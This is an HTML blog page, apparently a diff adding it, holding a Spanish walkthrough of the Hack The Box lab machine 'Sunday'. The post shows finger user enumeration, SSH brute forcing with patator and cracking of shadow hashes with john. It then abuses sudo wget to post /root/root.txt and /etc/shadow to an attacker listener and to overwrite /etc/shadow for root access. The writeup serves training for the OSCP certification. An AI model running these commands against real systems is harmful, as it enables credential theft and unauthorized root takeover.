@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>OSCP Path ~ Sunday de Hack The Box (Necesario VIP) | Pirrandi Blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="OSCP Path ~ Sunday de Hack The Box (Necesario VIP)" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Writeup de la maquina de HackTheBox llamada Sunday siguiendo el PATH para el OSCP" />
+<meta property="og:description" content="Writeup de la maquina de HackTheBox llamada Sunday siguiendo el PATH para el OSCP" />
+<link rel="canonical" href="http://localhost:4000/2021/07/29/Sunday.html" />
+<meta property="og:url" content="http://localhost:4000/2021/07/29/Sunday.html" />
+<meta property="og:site_name" content="Pirrandi Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-29T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="OSCP Path ~ Sunday de Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2021-07-29T00:00:00-03:00","datePublished":"2021-07-29T00:00:00-03:00","description":"Writeup de la maquina de HackTheBox llamada Sunday siguiendo el PATH para el OSCP","headline":"OSCP Path ~ Sunday de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/07/29/Sunday.html"},"url":"http://localhost:4000/2021/07/29/Sunday.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">OSCP Path ~ Sunday de Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/OSCP/">OSCP</a>
+      
+      <a class="tag" href="/tag/Path,/">Path,</a>
+      
+      <a class="tag" href="/tag/LFI,/">LFI,</a>
+      
+      <a class="tag" href="/tag/RCE,/">RCE,</a>
+      
+      <a class="tag" href="/tag/Burpsuite,/">Burpsuite,</a>
+      
+      <a class="tag" href="/tag/PHP,/">PHP,</a>
+      
+      <a class="tag" href="/tag/RDP-file,/">RDP-file,</a>
+      
+      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
+      
+      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
+      
+      <a class="tag" href="/tag/Writeup,/">Writeup,</a>
+      
+      <a class="tag" href="/tag/Hacking/">Hacking</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 29 Jul 2021</div>
+  
+  <noscript>
+    <div class="post-description">Writeup de la maquina de HackTheBox llamada Sunday siguiendo el PATH para el OSCP</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="sunday--hack-the-box-to-oscp">Sunday ~ Hack The Box to OSCP</h1>
+
+<p>Realizamos el escaneo con Nmap de puertos y servicios abiertos</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE  SERVICE VERSION
+79/tcp    open   finger  Sun Solaris fingerd
+| finger: Login       Name               TTY         Idle    When    Where<span class="se">\x</span>0D
+| sunny    sunny                 pts/2            Sat 17:20  10.10.16.210        <span class="se">\x</span>0D
+|_sammy    sammy                 pts/3            Sat 18:03  10.10.16.210        <span class="se">\x</span>0D
+111/tcp   open   rpcbind
+22022/tcp open   ssh     SunSSH 1.3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e <span class="o">(</span>DSA<span class="o">)</span>
+|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac <span class="o">(</span>RSA<span class="o">)</span>
+46385/tcp closed unknown
+63929/tcp closed unknown
+Service Info: OS: Solaris<span class="p">;</span> CPE: cpe:/o:sun:sunos
+</code></pre></div></div>
+
+<p>Vemos que tenemos el servicio <code class="language-plaintext highlighter-rouge">finger</code> que sirve para enumerar usuarios cuando se conectan</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># finger-user-enum.pl -U /opt/SecLists/Usernames/Names/names.txt -t 10.10.10.76                                                                                                                              1 ⚙</span>
+Starting finger-user-enum v1.0 <span class="o">(</span> http://pentestmonkey.net/tools/finger-user-enum <span class="o">)</span>
+
+ <span class="nt">----------------------------------------------------------</span>
+|                   Scan Information                       |
+ <span class="nt">----------------------------------------------------------</span>
+
+Worker Processes ......... 5
+Usernames file ........... /opt/SecLists/Usernames/Names/names.txt
+Target count ............. 1
+Username count ........... 10177
+Target TCP port .......... 79
+Query <span class="nb">timeout</span> ............ 5 secs
+Relay Server ............. Not used
+
+<span class="c">######## Scan started at Thu Jul 29 11:20:02 2021 #########</span>
+access@10.10.10.76: access No Access User                     &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..nobody4  SunOS 4.x NFS Anonym               &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..
+admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..lp       Line Printer Admin                 &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..uucp     uucp Admin                         &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..nuucp    uucp Admin                         &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..dladm    Datalink Admin                     &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..listen   Network Admin                      &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..
+anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
+bin@10.10.10.76: bin             ???                         &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..
+dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
+jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..jo                    ???..ann                   ???..
+la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
+line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..
+message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..
+miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..miof                  ???..mela                  ???..
+root@10.10.10.76: root     Super-User            pts/3        &lt;Apr 24, 2018&gt; sunday              ..
+sammy@10.10.10.76: sammy                 console      &lt;Jul 31, 2020&gt;..
+sunny@10.10.10.76: sunny                 pts/3        &lt;Apr 24, 2018&gt; 10.10.14.4          ..
+sys@10.10.10.76: sys             ???                         &lt; <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span>  <span class="nb">.</span> <span class="o">&gt;</span>..
+zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
+<span class="c">######## Scan completed at Thu Jul 29 11:57:39 2021 #########</span>
+15 results.
+
+10177 queries <span class="k">in </span>2257 seconds <span class="o">(</span>4.5 queries / sec<span class="o">)</span>
+</code></pre></div></div>
+<p>Se ve mucho ruido con esta herramienta, pues por eso es importante fijarnos solo en los usuarios que tenga fecha y hora.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user: sunny, sunday
+</code></pre></div></div>
+<p>Teniendo estos usuarios procedemos a probar fuerza bruta por el puerto SSH con la herramienta <code class="language-plaintext highlighter-rouge">patator</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="c"># patator ssh_login host=10.10.10.76 port=22022 user=FILE0 0=users.txt password=FILE1 1=passwd_ssh_brute -x ignore:fgrep='failed'</span>
+12:53:58 patator    INFO - Starting Patator 0.9 <span class="o">(</span>https://github.com/lanjelot/patator<span class="o">)</span> with python-3.9.2 at 2021-07-29 12:53 CEST
+12:53:58 patator    INFO -                                                                              
+12:53:58 patator    INFO - code  size    <span class="nb">time</span> | candidate                          |   num | mesg
+12:53:58 patator    INFO - <span class="nt">-----------------------------------------------------------------------------</span>
+12:54:13 patator    INFO - 0     19     5.936 | sunny:sunday                       |    11 | SSH-2.0-Sun_SSH_1.3
+12:54:14 patator    INFO - Hits/Done/Skip/Fail/Size: 1/18/0/0/18, Avg: 1 r/s, Time: 0h 0m 15s
+</code></pre></div></div>
+<h1 id="ssh-error-algorithms---solution">SSH Error Algorithms - Solution</h1>
+<p>Procedemos a intentar conectarnos por ssh con las credenciales obtenidas:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ssh sunny@10.10.10.76 -p 22022                                                                                                 </span>
+Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g<span class="o">==</span>,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
+</code></pre></div></div>
+<p>Se nos lanza un error por un algoritmo de codificacion llamado <code class="language-plaintext highlighter-rouge">diffie-helman</code>.. pero lo solucionamos de la siguiente forma:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ssh sunny@10.10.10.76 <span class="nt">-p</span> 22022 <span class="nt">-oKexALgorithms</span><span class="o">=</span>+diffie-hellman-group1-sha1
+</code></pre></div></div>
+<p>Con el parametro <code class="language-plaintext highlighter-rouge">-oKexALgorithms=</code> procedemos a especificarle el algoritmo que nos da problemas <code class="language-plaintext highlighter-rouge">+diffie-hellman-group1-sha1</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ssh sunny@10.10.10.76 -p 22022 -oKexALgorithms=+diffie-hellman-group1-sha1</span>
+Password: 
+Last login: Thu Jul 29 16:24:15 2021 from 10.10.16.212
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
+sunny@sunday:~<span class="nv">$ </span>
+</code></pre></div></div>
+<p>Conseguimos conectarnos correctamente. Procedemos a enumerar un poco el sistema.</p>
+
+<h1 id="escalada-de-privilegios-a-sammy">Escalada de Privilegios a Sammy</h1>
+<p>Procdemos con los comandos tipicos para enumera el sistema:
+<code class="language-plaintext highlighter-rouge">sudo -l</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sunny@sunday:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+User sunny may run the following commands on this host:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /root/troll
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">id</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sunny@sunday:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>65535<span class="o">(</span>sunny<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1<span class="o">(</span>other<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1<span class="o">(</span>other<span class="o">)</span>
+</code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">uname -a</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sunny@sunday:~<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
+SunOS sunday 5.11 snv_111b i86pc i386 i86pc Solaris
+</code></pre></div></div>
+<p>Procedemos a movernos a la raiz <code class="language-plaintext highlighter-rouge">/</code> para enumerar directorios</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /backup
+<span class="nb">cat </span>shadow.backup
+</code></pre></div></div>
+<p>Sacamos los Hashes de un archivo shadow.backup de los siguientes usuarios</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sammy:<span class="nv">$5$Ebkn8jlK$i6SSPa0</span>.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
+sunny:<span class="nv">$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3</span>:17636::::::
+</code></pre></div></div>
+<p>Procedo a intentar Crackearlos con el uso de <code class="language-plaintext highlighter-rouge">John</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># john --wordlist=/usr/share/wordlists/rockyou.txt hashes      </span>
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts <span class="o">(</span>sha256crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$5$ </span><span class="o">[</span>SHA256 256/256 AVX2 8x]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 5000 <span class="k">for </span>all loaded hashes
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+<span class="s2">"sunday "</span>          <span class="o">(</span>sunny<span class="o">)</span>
+<span class="s2">"cooldude!"</span>        <span class="o">(</span>sammy<span class="o">)</span>
+2g 0:00:00:10 DONE <span class="o">(</span>2021-07-29 13:29<span class="o">)</span> 0.1978g/s 20257p/s 20662c/s 20662C/s infinitig35..bluemoon2
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+<p>Probamos a usar el comando <code class="language-plaintext highlighter-rouge">su</code> para con la contraseña del usuario sammy conectarnos pero no nos funciona
+Porque no probamos por ssh</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ssh sammy@10.10.10.76 -p 22022 -oKexALgorithms=+diffie-hellman-group1-sha1                                                                                                                                  1 ⨯</span>
+Password: 
+Password: 
+Last login: Thu Jul 29 17:26:31 2021 from 10.10.16.218
+Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
+sammy@sunday:~<span class="nv">$ </span><span class="nb">ls
+</span>Desktop  Documents  Downloads  Public
+</code></pre></div></div>
+<p>Conseguimos entrar correctamente por ssh</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sammy@sunday:~<span class="nv">$ </span><span class="nb">cd </span>Desktop/
+sammy@sunday:~/Desktop<span class="nv">$ </span><span class="nb">ls
+</span>user.txt
+sammy@sunday:~/Desktop<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+a3d9498027ca5187ba1793xxxxxxxxxxxx
+</code></pre></div></div>
+<p>Sacamos la flag de <code class="language-plaintext highlighter-rouge">user.txt</code></p>
+
+<p>#Escalada de Privilegios a Root
+Procedemos a enumerar al user sammy</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sammy@sunday:~/Desktop<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+User sammy may run the following commands on this host:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/wget
+</code></pre></div></div>
+<p>Vale pues procedemos de la siguiente forma</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sammy@sunday:~/Desktop<span class="nv">$ </span><span class="nb">sudo </span>wget <span class="nt">--post-file</span> /root/root.txt http://10.10.16.218/80
+<span class="nt">--18</span>:05:40--  http://10.10.16.218/80
+           <span class="o">=&gt;</span> <span class="sb">`</span>80<span class="s1">'
+Connecting to 10.10.16.218:80... conectado.
+Petición HTTP enviada, esperando respuesta... 
+</span></code></pre></div></div>
+<p>Y nos ponemos en escucha con una session de <code class="language-plaintext highlighter-rouge">nc</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc -vlnp 80                                                                                                                                                                                                 1 ⨯</span>
+listening on <span class="o">[</span>any] 80 ...
+connect to <span class="o">[</span>10.10.16.218] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.76] 59492
+POST /80 HTTP/1.0
+User-Agent: Wget/1.10.2
+Accept: <span class="k">*</span>/<span class="k">*</span>
+Host: 10.10.16.218
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+fb40fab61d99d37536daeec0xxxxxxxxx
+</code></pre></div></div>
+<p>Ahi pillamos la flag de <code class="language-plaintext highlighter-rouge">/root/root.txt</code></p>
+
+<p>Consiguiendo la shell de root atraves del archivo /etc/shadow
+Nos tramitamos el archivo antes mencionado</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sammy@sunday:~<span class="nv">$ </span><span class="nb">sudo </span>wget <span class="nt">--post-file</span> /etc/shadow http://10.10.16.218/80                              
+<span class="nt">--15</span>:26:04--  http://10.10.16.218/80
+           <span class="o">=&gt;</span> <span class="sb">`</span>80<span class="s1">'
+Connecting to 10.10.16.218:80... conectado.
+Petición HTTP enviada, esperando respuesta... ^C
+</span></code></pre></div></div>
+<p>Nos ponemos en la escucha con :</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc -vlnp 80 &gt; shadow    </span>
+listening on <span class="o">[</span>any] 80 ...
+connect to <span class="o">[</span>10.10.16.218] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.76] 49713
+</code></pre></div></div>
+<p>Modificamos el archivo /etc/shadow desde nuestro Kali para meterle una password nueva al usuario root y ya poder conectarnos a el
+En mi caso e procedido copiando la contraseña del usuario <code class="language-plaintext highlighter-rouge">sammy</code> para a hacer <code class="language-plaintext highlighter-rouge">su root</code>y meter la pass de <code class="language-plaintext highlighter-rouge">sammy</code> conseguir ganar acceso a root
+Una vez modificado el archivo shadow, nos montamos un server en python3 para tramitar el archivo.
+Y ya procedemos a hacer uso de wget para copiarnos el shadow modificado</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sammy@sunday:~<span class="nv">$ </span><span class="nb">sudo </span>wget http://10.10.16.218/shadow <span class="nt">-O</span> /etc/shadow
+<span class="nt">--15</span>:35:30--  http://10.10.16.218/shadow
+           <span class="o">=&gt;</span> <span class="sb">`</span>/etc/shadow<span class="s1">'
+Connecting to 10.10.16.218:80... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 657 [application/octet-stream]
+
+100%[===========================================================&gt;] 657           --.--K/s             
+
+15:35:31 (16.60 KB/s) - `/etc/shadow'</span> saved <span class="o">[</span>657/657]
+</code></pre></div></div>
+<p>Ahora procedemos a hacer un su root</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sammy@sunday:~<span class="nv">$ </span>su root
+Password: 
+sammy@sunday:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+<p>Maquina Rooteada =)</p>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2021/07/29/Sunday.html';
+     this.page.identifier = '/2021/07/29/Sunday';
+     this.page.title = 'OSCP Path ~ Sunday de Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/06/27/Trick.html">
+            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/15/Attacktive-Directory.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" 